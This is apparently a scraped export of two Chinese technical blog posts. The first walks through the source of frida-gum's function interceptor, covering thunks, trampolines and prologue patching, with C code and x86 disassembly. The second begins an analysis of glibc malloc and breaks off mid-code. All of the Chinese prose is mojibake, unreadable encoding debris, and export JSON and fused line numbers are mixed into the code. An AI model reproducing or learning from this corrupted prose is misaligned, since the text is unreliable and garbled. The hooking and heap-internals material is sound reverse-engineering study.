ä¸ºäº†å®ç°è·¨å¹³å°ï¼ŒæŠ½è±¡å‡ºæ¥ æ„æ¶æ— å…³/å¹³å°æ— å…³/ç³»ç»Ÿæ— å…³çš„apiï¼Œæ¯”å¦‚ä¸€äº›å†…å­˜æ“ä½œï¼Œåœ¨frida-gumé‡Œå¯èƒ½å°±æ˜¯gum_xxxxxï¼Œä½†æ˜¯æ ¹æ®ä¸åŒå¹³å°ï¼Œè°ƒç”¨åˆ°å¯¹åº”å¹³å°çš„apié‡Œå»ï¼Œæ­£æ˜¯åšäº†å¾ˆå¥½çš„å°è£…ï¼Œä¸Šå±‚ä»£ç æ‰ä¼šçœ‹èµ·æ¥â€œå¹³å°æ— å…³â€ã€‚ è¿˜æœ‰å‡ ä¸ªæ ¸å¿ƒçš„å¯¹è±¡ï¼Œåé¢çš„ä»£ç é‡Œé¢‘ç¹æåŠï¼š 123456789101112131415struct _GumInterceptor{ GObject parent; GRecMutex mutex; GHashTable * function_by_address; GumInterceptorBackend * backend; GumCodeAllocator allocator; volatile guint selected_thread_id; GumInterceptorTransaction current_transaction;}; ä»è¿™ä¸ªæ‹¦æˆªå™¨ç±»ç´¢å¼•å‡ºå»çš„å¯¹è±¡éƒ½éœ€è¦å¥½å¥½æ³¨æ„ï¼Œæ¯”å¦‚ GumInterceptorBackend , æœ€å¥½å¯ä»¥ç”Ÿæˆä¸€ä¸ªumlå›¾ï¼Œé˜…è¯»ä»£ç çš„æ—¶å€™å¯¹æ¯”ç€çœ‹ã€‚ 2.2. ä»£ç é˜…è¯»2.2.1 å‡†å¤‡å·¥ä½œé¢å¯¹æ¯”è¾ƒå¤§çš„ä»£ç ï¼Œé‡è¦çš„æ˜¯æ‰¾åˆ°ä¸€ä¸ªå…¥å£ï¼Œä»è¿™ä¸ªç‚¹å¼€å§‹è¯»ï¼Œæˆ‘è¿™é‡Œå¤§æ¦‚çœ‹äº†ä¸‹å•å…ƒæµ‹è¯•çš„ä»£ç ï¼Œå‘ç°åŸºæœ¬æ˜¯: åˆå§‹åŒ–ï¼Œæµ‹è¯•å„ç§åŠŸèƒ½ï¼Œæ¸…ç†ï¼Œé€€å‡ºã€‚ é‚£ä¹ˆæˆ‘çš„é˜…è¯»æ€è·¯å°±æ˜¯ : åˆå§‹åŒ–éƒ¨åˆ† å„ç§åŠŸèƒ½ï¼Œæ¯”å¦‚ å†…å­˜æ¨¡å—ï¼ŒæŒ‡ä»¤è¯»å†™æ¨¡å—ï¼Œä»£ç ä¿®å¤æ¨¡å— æ¸…ç† è¿™éƒ¨åˆ†å¤§æ¦‚è¿‡ä¸€ä¸‹å°±è¡Œ è¿™é‡Œæˆ‘å‚è€ƒäº† jmpewså¸ˆå‚…çš„å…³äºè®¾è®¡hookæ¡†æ¶çš„æ–‡ç« ï¼Œäº†è§£ä¸€ä¸ªhookæ¡†æ¶å¦‚ä½•è®¾è®¡ï¼Œåˆ†å“ªäº›æ¨¡å—ï¼Œåœ¨é˜…è¯»ä»£ç çš„æ—¶å€™èƒ½å¤Ÿæœ‰é’ˆå¯¹æ€§ä¸€äº›ã€‚ å†…å­˜åˆ†é… æ¨¡å— æŒ‡ä»¤å†™ æ¨¡å— æŒ‡ä»¤è¯» æ¨¡å— æŒ‡ä»¤ä¿®å¤ æ¨¡å— relocator è·³æ¿ æ¨¡å— è°ƒåº¦å™¨ æ¨¡å— enter_thunkéƒ¨åˆ†å®ç° æ ˆ æ¨¡å— å…·ä½“å¯ä»¥å‚è€ƒä»–çš„æ–‡ç« : å¦‚ä½•æ„å»ºä¸€æ¬¾åƒ frida ä¸€æ ·çš„æ¡†æ¶ 2.2.2 hookä»0åˆ°1é˜…è¯»é¡ºåºæ ¹æ®å•å…ƒæµ‹è¯•gum-test.cç¡®å®šçš„ï¼Œå…·ä½“çš„å¯ä»¥çœ‹ä»£ç  gum_interceptor_obtain()è¿™éƒ¨åˆ†æ˜¯ æ‹¦æˆªå™¨åˆå§‹åŒ– 12345678910111213141516171819202122232425262728293031323334353637383940414243// åˆå§‹åŒ– interceptor å¯¹è±¡åˆå§‹åŒ–GumInterceptor *gum_interceptor_obtain (void){ GumInterceptor * interceptor; g_mutex_lock (&amp;_gum_interceptor_lock); if (_the_interceptor != NULL) { interceptor = GUM_INTERCEPTOR (g_object_ref (_the_interceptor)); } else { _the_interceptor = g_object_new (GUM_TYPE_INTERCEPTOR, NULL); g_object_weak_ref (G_OBJECT (_the_interceptor), the_interceptor_weak_notify, NULL); interceptor = _the_interceptor; } g_mutex_unlock (&amp;_gum_interceptor_lock); return interceptor;}static voidgum_interceptor_init (GumInterceptor * self){ g_rec_mutex_init (&amp;self-&gt;mutex); self-&gt;function_by_address = g_hash_table_new_full (NULL, NULL, NULL, (GDestroyNotify) gum_function_context_destroy); // åˆ†é…å™¨åˆå§‹åŒ– gum_code_allocator_init (&amp;self-&gt;allocator, GUM_INTERCEPTOR_CODE_SLICE_SIZE); // åˆ›å»ºæ‹¦æˆªå™¨åç«¯ self-&gt;backend = _gum_interceptor_backend_create (&amp;self-&gt;allocator); gum_interceptor_transaction_init (&amp;self-&gt;current_transaction, self);} å› ä¸ºGObjectçš„ä½¿ç”¨ï¼Œgum_interceptor_init è¿™ä¸ªæ„é€ å‡½æ•°ï¼Œåœ¨ interceptorå¯¹è±¡åˆ›å»ºå‡ºæ¥çš„æ—¶å€™è§¦å‘ã€‚ é‡ç‚¹çœ‹æ‹¦æˆªå™¨åç«¯çš„åˆå§‹åŒ– 1234567891011121314151617GumInterceptorBackend *_gum_interceptor_backend_create (GumCodeAllocator * allocator){ GumInterceptorBackend * backend; backend = g_slice_new (GumInterceptorBackend); backend-&gt;allocator = allocator; //åˆå§‹åŒ– codewriterå’Œrelocator gum_x86_writer_init (&amp;backend-&gt;writer, NULL); gum_x86_relocator_init (&amp;backend-&gt;relocator, NULL, &amp;backend-&gt;writer); // åˆ›å»º thunk gum_interceptor_backend_create_thunks (backend); return backend;} è¿™é‡Œåˆå§‹åŒ–çš„writerå’Œrelocatoråˆ†åˆ«ç”¨äºæŒ‡ä»¤å†™å’ŒæŒ‡ä»¤æ¢å¤ã€‚ thunksçš„åˆå§‹åŒ–ï¼Œè¿™ä¸¤ä¸ªæ˜¯ç”¨äºè°ƒåº¦æ‰§è¡Œï¼Œåˆ†åˆ«å¯¹åº” è¿›å…¥hookå’Œç¦»å¼€hookã€‚ 1234567891011121314151617static voidgum_interceptor_backend_create_thunks (GumInterceptorBackend * self){ GumX86Writer * cw = &amp;self-&gt;writer; self-&gt;enter_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator); gum_x86_writer_reset (cw, self-&gt;enter_thunk-&gt;data); gum_emit_enter_thunk (cw); gum_x86_writer_flush (cw); g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;enter_thunk-&gt;size); self-&gt;leave_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator); gum_x86_writer_reset (cw, self-&gt;leave_thunk-&gt;data); gum_emit_leave_thunk (cw); gum_x86_writer_flush (cw); g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;leave_thunk-&gt;size);} å› ä¸ºåŸç†ç±»ä¼¼ï¼Œåªä¸¾ä¾‹enter_thunk 123456789101112131415161718192021222324static voidgum_emit_enter_thunk (GumX86Writer * cw){ const gssize return_address_stack_displacement = 0; // save ret addr gum_emit_prolog (cw, return_address_stack_displacement); // æ„é€ è‡ªå·±çš„å‡½æ•°æ ˆ gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XSI, GUM_REG_XBP, GUM_FRAME_OFFSET_CPU_CONTEXT); gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XDX, GUM_REG_XBP, GUM_FRAME_OFFSET_TOP); gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XCX, GUM_REG_XBP, GUM_FRAME_OFFSET_NEXT_HOP); gum_x86_writer_put_call_address_with_aligned_arguments (cw, GUM_CALL_CAPI, GUM_ADDRESS (_gum_function_context_begin_invocation), 4, GUM_ARG_REGISTER, GUM_REG_XBX, GUM_ARG_REGISTER, GUM_REG_XSI, GUM_ARG_REGISTER, GUM_REG_XDX, GUM_ARG_REGISTER, GUM_REG_XCX); gum_emit_epilog (cw);} gum_interceptor_attach_listener1234567891011GumAttachReturngum_interceptor_attach_listener (GumInterceptor * self, gpointer function_address, GumInvocationListener * listener, gpointer listener_function_data){...} gum_interceptor_transaction_begingum_interceptor_instrument âœ¨è¿™é‡Œè¦è¯´çš„æ˜¯ function_address å°±æ˜¯è¦hookçš„ç›®æ ‡å‡½æ•°ï¼Œfrida-gumæŠŠè¦hookçš„ç›®æ ‡å°è£…æˆäº† GumFunctionContextå¯¹è±¡ï¼Œæ–¹ä¾¿æ“ä½œ 123function_address = gum_interceptor_resolve (self, function_address); // ? // åˆ›å»ºè·³æ¿ function_ctx = gum_interceptor_instrument (self, function_address); 1234567891011121314151617181920212223242526272829303132333435static GumFunctionContext *gum_interceptor_instrument (GumInterceptor * self, gpointer function_address){ GumFunctionContext * ctx; // è¦hookçš„å‡½æ•°ï¼Œå°è£…æˆäº† GumFunctionContextï¼Œæ­¤æ—¶ // æ ¹æ® åœ°å€ï¼Œå¾—åˆ°ä¸ä¹‹å¯¹åº”çš„ GunFunctionContextå¯¹è±¡ ctx = (GumFunctionContext *) g_hash_table_lookup (self-&gt;function_by_address, function_address); if (ctx != NULL) return ctx; // å¦‚æœè·å–åˆ°çš„æ˜¯ç©ºçš„å¯¹è±¡ï¼Œå¿…é¡»åˆå§‹åŒ–äº†æ‰èƒ½ä½¿ç”¨ // åªå†™å‡ ä¸ªå­—æ–­ï¼Œåˆ†é…å†…å­˜/hookçš„å‡½æ•°åœ°å€/interceptoræˆå‘˜ ctx = gum_function_context_new (self, function_address); if (ctx == NULL) return NULL; // åˆ›å»ºè·³æ¿ if (!_gum_interceptor_backend_create_trampoline (self-&gt;backend, ctx)) { gum_function_context_finalize (ctx); return NULL; } // è®¾ç½®å®Œæˆåï¼Œ æ·»åŠ åˆ°å“ˆå¸Œè¡¨ // hash_table, key, value // hookå‡½æ•°åœ°å€ï¼ŒGumFunctionContextå¯¹è±¡å¯¹åº”ï¼Œ æ–¹ä¾¿æŸ¥æ‰¾ g_hash_table_insert (self-&gt;function_by_address, function_address, ctx); // å½“å‰ transaction æ·»åŠ åˆ° ä»»åŠ¡ä¸­ï¼Œ è®¾ç½®å›è°ƒ å‡½æ•° gum_interceptor_activate æ‹¦æˆªå™¨æ¿€æ´»å‡½æ•° gum_interceptor_transaction_schedule_prologue_write ( &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate); return ctx;} è¿™é‡Œè´´ä¸€ä¸‹è·³æ¿ä»£ç æ–¹ä¾¿ç†è§£ï¼š 1234567891000C30200 mov al,byte ptr ds:[FF00C121h] 00C30205 xor eax,0C30200h 00C3020A jmp 00C30000 // è·³åˆ°ä¸Šé¢çš„ enter_thunk00C3020F push dword ptr ds:[0C30200h] 00C30215 jmp 00C30100 // è·³åˆ° leave_thunk// åŸå‡½æ•°ä¿®å¤çš„æŒ‡ä»¤ï¼Œ7ä¸ªå­—èŠ‚00C3021A push ebp 00C3021B mov ebp,esp 00C3021D cmp dword ptr [ebp+8],0 00C30221 jmp gum_test_target_function+7h (0D6FB97h) // è·³å›åŸå‡½æ•°ï¼Œå› ä¸ºå†™è·³è½¬ç”¨äº†7å­—èŠ‚ï¼Œæ‰€ä»¥+7 gum_interceptor_transaction_end123// å½“å‰ transaction æ·»åŠ åˆ° ä»»åŠ¡ä¸­ï¼Œ è®¾ç½®å›è°ƒ å‡½æ•° gum_interceptor_activate æ‹¦æˆªå™¨æ¿€æ´»å‡½æ•° gum_interceptor_transaction_schedule_prologue_write ( &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate); 12345678910111213141516// æ‹¦æˆªå™¨æ¿€æ´»static voidgum_interceptor_activate (GumInterceptor * self, GumFunctionContext * ctx, gpointer prologue){ if (ctx-&gt;destroyed) return; g_assert (!ctx-&gt;activated); ctx-&gt;activated = TRUE; // æ¿€æ´» _gum_interceptor_backend_activate_trampoline (self-&gt;backend, ctx, prologue);} 1234567891011121314151617181920212223_gum_interceptor_backend_activate_trampoline (GumInterceptorBackend * self, GumFunctionContext * ctx, gpointer prologue){ GumX86Writer * cw = &amp;self-&gt;writer; guint padding; // è®¾ç½®base gum_x86_writer_reset (cw, prologue); // è®¾ç½®pc cw-&gt;pc = GPOINTER_TO_SIZE (ctx-&gt;function_address); // å†™jmpï¼Œ è·³è½¬åˆ° è·³æ¿ä¸­ï¼Œ è¿›å…¥è·³æ¿è¿™å·²ç»åˆ°hooké‡Œäº† gum_x86_writer_put_jmp_address (cw, GUM_ADDRESS (ctx-&gt;on_enter_trampoline)); gum_x86_writer_flush (cw); g_assert_cmpint (gum_x86_writer_offset (cw), &lt;=, GUM_INTERCEPTOR_REDIRECT_CODE_SIZE); // åŸæœ¬ä»£ç ï¼ˆhookç‚¹ï¼‰ï¼Œå‰©ä½™çš„åœ°æ–¹nopè¡¥é½ padding = ctx-&gt;overwritten_prologue_len - gum_x86_writer_offset (cw); for (; padding != 0; padding--) gum_x86_writer_put_nop (cw); gum_x86_writer_flush (cw);} 2.2.3 æ‰§è¡Œæµç¨‹é€šè¿‡è®¾ç½®å‡½æ•°è¿”å›åœ°å€(__gum_function_context_begin/end_invocation)ï¼Œæ§åˆ¶æµç¨‹ï¼Œè¿™å°±æ˜¯ROPï¼š 123456789101112131415åŸå‡½æ•°----------------------------------------------------è·³æ¿ 02C80204----------------------------------------------------`enter_chunk` // é¦–å…ˆè¦ä¿å­˜ç°åœº, æ„é€ æ ˆå¸§ï¼Œéšåè¿›å…¥ä¸‹ä¸€ä¸ªå‡½æ•° â¬‡ï¸`__gum_function_context_begin_invocation` // é€šè¿‡è®¾ç½®æ ˆ(ret addr)æ§åˆ¶æ‰§è¡Œæµç¨‹ ----------------------------------------------------replacement_function----------------------------------------------------è·³æ¿ 02C8020F----------------------------------------------------`leave_chunk``__gum_function_context_end_invocation` ----------------------------------------------------ç»§ç»­æ‰§è¡Œ 0x03 : è°ƒè¯•åˆ†æå¸®åŠ©ç†è§£è¿™é‡Œè°ƒè¯•äº†å•å…ƒæµ‹è¯•ä¸­å†™hookå’Œå‡½æ•°æ›¿æ¢çš„é€»è¾‘ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š _gum_interceptor_backend_create() åç«¯åˆå§‹åŒ–ï¼Œåˆå§‹åŒ–ä¸¤ä¸ªthunk enter_thunk 123456789101112131415161718192021222324252600C30000 pushfd 00C30001 cld 00C30002 pushad 00C30003 lea esp,[esp-4] 00C3000A lea eax,[esp+2Ch] 00C30011 mov dword ptr [esp+10h],eax 00C30015 mov ebx,dword ptr [esp+28h] 00C30019 mov ebp,esp 00C3001B and esp,0FFFFFFF0h 00C30021 sub esp,200h 00C30027 fxsave [esp] 00C3002B lea esi,[ebp] 00C30031 lea edx,[ebp+2Ch] 00C30037 lea ecx,[ebp+28h] 00C3003D push ecx 00C3003E push edx 00C3003F push esi 00C30040 push ebx 00C30041 call __gum_function_context_begin_invocation (0CE8E1Fh) 00C30046 add esp,10h 00C30049 fxrstor [esp] 00C3004D mov esp,ebp 00C3004F lea esp,[esp+4] 00C30056 popad 00C30057 popfd 00C30058 ret leave_thunk 123456789101112131415161718192021222324252600C30100 pushfd 00C30101 cld 00C30102 pushad 00C30103 lea esp,[esp-4] 00C3010A lea eax,[esp+28h] 00C30111 mov dword ptr [esp+10h],eax 00C30115 mov ebx,dword ptr [esp+28h] 00C30119 mov ebp,esp 00C3011B and esp,0FFFFFFF0h 00C30121 sub esp,200h 00C30127 fxsave [esp] 00C3012B lea esi,[ebp] 00C30131 lea edx,[ebp+28h] 00C30137 sub esp,4 00C3013A push edx 00C3013B push esi 00C3013C push ebx 00C3013D call __gum_function_context_end_invocation (0CEAB1Bh) 00C30142 add esp,0Ch 00C30145 add esp,4 00C30148 fxrstor [esp] 00C3014C mov esp,ebp 00C3014E lea esp,[esp+4] 00C30155 popad 00C30156 popfd 00C30157 ret 12345678// hook æ„é€ GumAttachReturngum_interceptor_attach (GumInterceptor * self, gpointer function_address, GumInvocationListener * listener, gpointer listener_function_data) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162GumAttachReturngum_interceptor_attach (GumInterceptor * self, gpointer function_address, GumInvocationListener * listener, gpointer listener_function_data){ GumAttachReturn result = GUM_ATTACH_OK; GumFunctionContext * function_ctx; if (gum_process_get_code_signing_policy () == GUM_CODE_SIGNING_REQUIRED) goto policy_violation; gum_interceptor_ignore_current_thread (self); GUM_INTERCEPTOR_LOCK (self); gum_interceptor_transaction_begin (&amp;self-&gt;current_transaction); self-&gt;current_transaction.is_dirty = TRUE; // è·å–hookç›®æ ‡å‡½æ•°çš„åœ°å€ function_address = gum_interceptor_resolve (self, function_address); // è·å–è¿™ä¸ªå‡½æ•°çš„ GumFunctionContext å¯¹è±¡ // æ²¡æœ‰å°±æ–°å»ºä¸€ä¸ª // è¿™é‡Œå·²ç» å‡†å¤‡å¥½äº†è·³æ¿ï¼Œå†™å¥½äº†hook // æ·»åŠ ä»»åŠ¡,è®¾ç½®ç›¸å¯¹åº”çš„å›è°ƒå‡½æ•° function_ctx = gum_interceptor_instrument (self, function_address); if (function_ctx == NULL) goto wrong_signature; if (gum_function_context_has_listener (function_ctx, listener)) goto already_attached; // æ·»åŠ ç›‘å¬å™¨ gum_function_context_add_listener (function_ctx, listener, listener_function_data); goto beach;policy_violation: { return GUM_ATTACH_POLICY_VIOLATION; }wrong_signature: { result = GUM_ATTACH_WRONG_SIGNATURE; goto beach; }already_attached: { result = GUM_ATTACH_ALREADY_ATTACHED; goto beach; }beach: { // åˆ°è¿™é‡Œï¼ŒåŸºæœ¬æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œhookä»€ä¹ˆéƒ½æ‰“å¥½äº† // æ‹¦æˆªå™¨æ¿€æ´» è·³æ¿æ¿€æ´» // è¿™é‡ŒæŠŠåŸå‡½æ•°å¼€å¤´æ”¹å†™ gum_interceptor_transaction_end (&amp;self-&gt;current_transaction); GUM_INTERCEPTOR_UNLOCK (self); gum_interceptor_unignore_current_thread (self); return result; }} on_invoke_trampoline è·³æ¿ 1234567891000C30200 mov al,byte ptr ds:[FF00C121h] 00C30205 xor eax,0C30200h 00C3020A jmp 00C30000 // è·³åˆ°ä¸Šé¢çš„ enter_thunk00C3020F push dword ptr ds:[0C30200h] 00C30215 jmp 00C30100 // è·³åˆ° leave_thunk// åŸå‡½æ•°ä¿®å¤çš„æŒ‡ä»¤ï¼Œ7ä¸ªå­—èŠ‚00C3021A push ebp 00C3021B mov ebp,esp 00C3021D cmp dword ptr [ebp+8],0 00C30221 jmp gum_test_target_function+7h (0D6FB97h) // è·³å›åŸå‡½æ•°ï¼Œå› ä¸ºå†™è·³è½¬ç”¨äº†7å­—èŠ‚ï¼Œæ‰€ä»¥+7 gum_interceptor_transaction_end (&amp;self-&gt;current_transaction); è°ƒç”¨ gum_interceptor_activate() ç„¶å_gum_interceptor_backend_activate_trampolie() éšåï¼Œç›®æ ‡å‡½æ•°å¼€å¤´è¢«ä¿®æ”¹ï¼š 12345678gpointer GUM_NOINLINEgum_test_target_function (GString * str){00D6FB90 jmp 00C30204 if (str != NULL)00D6FB95 nop 00D6FB96 nop 00D6FB97 je gum_test_target_function+19h (0D6FBA9h) ç›´æ¥è·³è½¬åˆ° 00C30204, å…¶å®å°±æ˜¯ è·³æ¿ï¼Œå› ä¸ºåæ±‡ç¼–çš„åœ°å€å·®äº†ç‚¹ï¼Œæ‰€ä»¥å¼€å§‹çš„æŒ‡ä»¤ä¸å¤ªä¸€æ ·: 1234567891011121300C30204 push dword ptr ds:[0C30200h] 00C3020A jmp 00C30000 00C3020F push dword ptr ds:[0C30200h] 00C30215 jmp 00C30100 00C3021A push ebp 00C3021B mov ebp,esp 00C3021D cmp dword ptr [ebp+8],0 00C30221 jmp gum_test_target_function+7h (0D6FB97h) 00C30226 add byte ptr [eax],al 00C30228 add byte ptr [eax],al 00C3022A add byte ptr [eax],al 00C3022C add byte ptr [eax],al 00C3022E add byte ptr [eax],al è°ƒç”¨æµç¨‹è°ƒè¯•åˆ†æï¼Œè¿™é‡Œåˆ†ä¸¤ä¸ªæƒ…å†µï¼Œæ˜¯å¦å­˜åœ¨``replacement_function` é¦–å…ˆæ˜¯ä¸å­˜åœ¨ï¼Œåªæ˜¯æ‰“ä¸ªhook(æ ¹æ® TESTCASE(attach_one);) 123456789101112131415161718call åŸå‡½æ•°----------------------------------------------------åŸå‡½æ•°----------------------------------------------------è·³æ¿----------------------------------------------------`enter_chunk` // é¦–å…ˆè¦ä¿å­˜ç°åœº, æ„é€ æ ˆå¸§ï¼Œéšåè¿›å…¥ä¸‹ä¸€ä¸ªå‡½æ•° â¬‡ï¸`__gum_function_context_begin_invocation` // é€šè¿‡è®¾ç½®æ ˆ(ret addr)æ§åˆ¶æ‰§è¡Œæµç¨‹ ----------------------------------------------------è·³æ¿+n (00C3021A) // æ‰§è¡ŒåŸå‡½æ•°çš„ ä¿®å¤çš„è‹¥å¹²å­—èŠ‚----------------------------------------------------åŸå‡½æ•°----------------------------------------------------`leave_chunk` `__gum_function_context_end_invocation`----------------------------------------------------ç»§ç»­æ‰§è¡Œ.... å­˜åœ¨æ›¿æ¢çš„å‡½æ•°(TESTCASE(replace_one);) 12345678910111213141516åŸå‡½æ•°----------------------------------------------------è·³æ¿ 02C80204----------------------------------------------------`enter_chunk` // é¦–å…ˆè¦ä¿å­˜ç°åœº, æ„é€ æ ˆå¸§ï¼Œéšåè¿›å…¥ä¸‹ä¸€ä¸ªå‡½æ•° â¬‡ï¸`__gum_function_context_begin_invocation` // é€šè¿‡è®¾ç½®æ ˆ(ret addr)æ§åˆ¶æ‰§è¡Œæµç¨‹ ----------------------------------------------------replacement_function----------------------------------------------------è·³æ¿ 02C8020F----------------------------------------------------`leave_chunk``__gum_function_context_end_invocation` ----------------------------------------------------ç»§ç»­æ‰§è¡Œ replace_one çš„è·³æ¿ 12345678902C80204 push dword ptr ds:[2C80200h] 02C8020A jmp 02C80000 02C8020F push dword ptr ds:[2C80200h] 02C80215 jmp 02C80100 02C8021A mov edi,edi 02C8021C push ebp 02C8021D mov ebp,esp 02C8021F jmp malloc+5h (01E5A7B5h) 0x04 : ç»“è¯­è¿™ä¸ªè¿‡ç¨‹å¤§æ¦‚èŠ±äº†æˆ‘ä¸€å‘¨ 5å¤©å¤šçš„æ ·å­ï¼ŒæŒºéš¾çš„ä¸ªäººæ„Ÿè§‰ï¼Œéœ€è¦æ‹æ¸…æ¥šçš„è¯ï¼Œé…åˆè°ƒè¯•ä¼šå¥½å¾ˆå¤šï¼Œæœ€å¼€å§‹æˆ‘ç›´æ¥çœ‹çš„ä»£ç ï¼Œçœ‹+åšç¬”è®°ï¼Œè„‘å†…debugï¼Œæœ€åç¼–è¯‘äº†å·¥ç¨‹ï¼Œvsè°ƒè¯•ï¼Œæ¸…æ™°å¤šäº†ï¼Œè¿˜æ˜¯å»ºè®®è¾¹è°ƒè¯•è¾¹çœ‹ã€‚ å¦‚æœæ–‡ä¸­æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¬¢è¿æ‰¹è¯„æŒ‡æ­£ : ) åé¢å¯èƒ½ä¼šåœ¨ä»–åŸºç¡€ä¸Šåšç‚¹äº‹æƒ…å§â€¦è¿™æ¡†æ¶çœŸç‰›é€¼ ! 0x05 : å‚è€ƒä¸å¼•ç”¨rida-gumæºç è§£è¯» gobject cè¯­è¨€ å¦‚ä½•æ„å»ºä¸€æ¬¾åƒ frida ä¸€æ ·çš„æ¡†æ¶","link":"/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/"},{"title":"Have fun with glibcå†…å­˜ç®¡ç†","text":"ä½¿ç”¨çš„æºç ç‰ˆæœ¬ glibc-2.24 æŒç»­æ›´æ–°ï¼Œæ²»ç–—æ‹–å»¶ç—‡ã€‚ 1.malloc åˆ†æâ€‹ mallocå…¶å®æ˜¯è°ƒç”¨äº†void *__libc_malloc (size_t bytes)ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°å®è´¨æ˜¯å¯¹static void *_int_malloc (mstate av, size_t bytes) çš„å°è£…ã€‚ â€‹ åˆ†æå¼€å§‹ï¼Œå…ˆæ¥çœ‹void *__libc_malloc (size_t bytes)å‡½æ•° 1234567891011121314151617181920212223242526272829303132void *__libc_malloc (size_t bytes){ mstate ar_ptr; void *victim; //é¦–å…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨å†…å­˜åˆ†é…çš„hookå‡½æ•°ï¼Œå¦‚æœæœ‰ï¼Œå°±ç›´æ¥è°ƒç”¨ï¼›hookå‡½æ•°ä¸»è¦ //æ˜¯è¿›ç¨‹åˆ›å»ºæ–°çº¿ç¨‹çš„æ—¶å€™å†…å­˜åˆ†é…ï¼Œæˆ–è€…æ”¯æŒç”¨æˆ·æä¾›çš„å†…å­˜åˆ†é…å‡½æ•°ã€‚ void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); } //è‹¥åˆ†é…æˆåŠŸï¼Œé‡Šæ”¾é” if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;} arena_get (ar_ptr, bytes)å±•å¼€å®å°±æ˜¯ 1234#define arena_get(ptr, size) do { \\ ptr = thread_arena; \\ arena_lock (ptr, size); \\ } while (0) â€‹ è·å¾—åˆ†é…åŒºå¹¶åŠ é”ï¼Œä¹‹åå°±è¿›å…¥äº†ä¸»è¦è´Ÿè´£å†…å­˜åˆ†é…çš„_int_malloc (ar_ptr, bytes)å‡½æ•° â€‹ è¯¥å‡½æ•°ä»£ç ç‰¹åˆ«é•¿ï¼Œåªèƒ½ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†çœ‹äº†ï¼Œé¦–å…ˆç»™å‡ºåŸå‹ï¼Œå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå³åˆ†é…åŒºå’Œè¦åˆ†é…çš„å†…å­˜çš„å¤§å°(ç”¨æˆ·ä¼ è¿›æ¥çš„ï¼Œå¹¶ä¸æ˜¯çœŸæ­£çš„è¦åˆ†é…çš„å¤§å°)ã€‚ 1.æ¦‚è¿°1234567891011121314151617181920212223242526272829303132333435363738394041static void *_int_malloc (mstate av, size_t bytes) //åˆ†é…åŒºï¼Œå¤§å°{ INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ const char *errstr = NULL; /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size (bytes, nb); /* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if (__glibc_unlikely (av == NULL)) { void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; } è¿™ä¸ªè½¬æ¢æ˜¯æŠŠéœ€è¦çš„å†…å­˜å¤§å°bytesï¼Œè½¬æ¢æˆéœ€è¦åˆ†é…çš„chunkçš„å¤§å°nbã€‚ 123456789101112#define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE (req)) { \\ __set_errno (ENOMEM); \\ return 0; \\ } \\ (sz) = request2size (req);#define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 2.fastbinå¦‚æœåˆ†é…å¤§å°æ­£å¥½æ˜¯fastbinï¼Œé‚£å°±ç›´æ¥ä»fastbinåˆ†é…ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ //è¦åˆ†é…çš„å€¼å°äºç­‰äºæœ€å¤§çš„fastbinå¤§å° if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) { idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp = *fb; do { victim = pp; if (victim == NULL) break; } while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim); if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = &quot;malloc(): memory corruption (fast)&quot;; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL; } check_remalloced_chunk (av, victim, nb); void *p = 